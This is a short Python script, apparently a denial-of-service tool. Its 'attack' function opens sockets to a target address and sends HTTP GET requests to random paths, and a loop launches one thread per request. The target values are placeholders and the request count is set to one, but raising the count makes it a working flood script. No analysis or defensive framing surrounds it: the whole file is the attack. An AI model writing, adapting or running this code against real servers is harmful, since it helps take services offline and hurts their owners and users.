
import random,socket,string,sys,threading,time
host = 'destination_host'
ip = 'destination_ip'
port = 666
num_requests = 1
try:
    host = str(host.replace('https://', '').replace('http://', '').replace('www.', ''))
    #ip = socket.gethostbyname(host)
except socket.gaierror:
    print (' ERROR\n Make sure you entered a correct website')
    quit()
thread_num = 0
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    thread_num_mutex.release()

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = ''.join(random.sample(msg, 5))
    return data

def attack():
    print_status()
    url_path = generate_url_path()
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((ip, port))
        msg = 'GET /%s HTTP/1.1\nHost: %s\n\n' % (url_path, host)
        byt = msg.encode()
        dos.send(byt)
    except socket.error:
        print ('\n [ No connection, server may be down ]: ' + str(socket.error))
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)